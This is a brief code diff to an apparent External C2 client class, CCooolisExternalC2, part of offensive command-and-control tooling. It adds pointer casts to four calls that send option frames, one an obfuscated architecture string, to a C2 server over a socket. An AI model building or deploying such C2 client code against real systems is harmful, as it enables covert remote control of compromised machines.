@@ -105,10 +105,10 @@ BOOL CCooolisExternalC2::SendOptions()
 #else
     std::string arch = CooolisString("YXJjaD14ODY=");
 #endif
-    send_frame(socket_extc2, arch.data(), 8);
-    send_frame(socket_extc2, pipename.data(), pipename.length());
-    send_frame(socket_extc2, block.data(), 9);
-    send_frame(socket_extc2, go.data(), 2);
+    send_frame(socket_extc2, (PCHAR)arch.data(), 8);
+    send_frame(socket_extc2, (PCHAR)pipename.data(), pipename.length());
+    send_frame(socket_extc2, (PCHAR)block.data(), 9);
+    send_frame(socket_extc2, (PCHAR)go.data(), 2);
 
     return TRUE;
 }
